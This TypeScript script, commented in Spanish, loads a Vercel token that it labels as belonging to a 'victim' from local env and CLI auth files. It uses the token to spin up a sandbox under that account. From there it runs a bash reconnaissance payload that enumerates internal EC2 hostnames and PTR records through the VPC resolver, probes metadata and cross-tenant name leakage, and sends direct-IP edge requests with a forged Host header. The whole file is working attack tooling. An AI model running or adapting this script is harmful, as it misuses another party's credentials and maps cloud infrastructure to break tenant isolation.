import { Sandbox } from "@vercel/sandbox";
import { readFileSync, writeFileSync } from "fs";

function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local", "utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json", "utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}

const VICTIM = loadToken();
if (!VICTIM) { console.error("no token"); process.exit(1); }
let V: any;
try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const CMD = `
set +e
echo "===== 1. enumeracion hostnames .ec2.internal en VPC (172.31.0.0/16) ====="
echo "--- busqueda en subred 172.31.0.0/16 (muestreo de .2 a .x) ---"
for ip in 2 7 8 9 10 16 17 20 50 100 150 200 250 253 254; do
  for a in 0 16 32 64; do
    r=$(dig +short +time=1 +tries=1 ip-172-31-\${a}-\${ip}.ec2.internal @172.31.0.2 2>/dev/null | head -1)
    [[ -n "$r" ]] && echo "ip-172-31-\${a}-\${ip}.ec2.internal -> $r"
  done
done
echo "--- PTR inverso de 172.31.x.x ---"
for ip in 16.7 0.2 16.1 16.20 0.10; do
  r=$(dig +short +time=1 +tries=1 -x 172.31.\${ip} @172.31.0.2 2>/dev/null | head -1)
  echo "172.31.\${ip} PTR -> " $r
done
echo ""
echo "===== 2. el resolver revela hostnames de OTROS tenants? ====="
echo "--- ec2.internal generico + metadatos ---"
for h in metadata.ec2.internal 169.254.169.254 ec2.internal ip-172-31-255-255.ec2.internal; do
  r=$(dig +short +time=1 +tries=1 $h @172.31.0.2 2>/dev/null | head -1)
  echo "$h -> " $r
done
echo ""
echo "===== 3. el edge responde por IP directa? (via dominio con Host header) ====="
echo "--- connect a edge IP del dominio de la victima ---"
timeout 5 curl -s -o /dev/null -w "IP_edge directo code=%{http_code}\\n" --max-time 4 "http://64.239.123.1/" -H "Host: sb-1phoxyil6njl.vercel.run" 2>&1 | tail -1
timeout 5 curl -s -k -o /dev/null -w "IP_edge https code=%{http_code}\\n" --max-time 4 "https://64.239.123.1/" -H "Host: sb-1phoxyil6njl.vercel.run" 2>&1 | tail -1
echo ""
echo "===== 4. x-vercel-id / headers del origen de la victima (via edge) ====="
timeout 8 curl -s -D - -o /dev/null --max-time 6 "https://sb-1phoxyil6njl.vercel.run/" 2>&1 | grep -iE "x-vercel|server|cf-|via|connection" | head -20
echo "===== DONE ====="
`;

async function main() {
  const sbx = await Sandbox.create({
    name: "recon-dns-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const res = await sbx.runCommand("bash", ["-c", CMD], { wait: true, timeout: 90_000 });
  const out = await res.output("both");
  writeFileSync("/tmp/dns_recon.txt", out);
  console.log(out);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });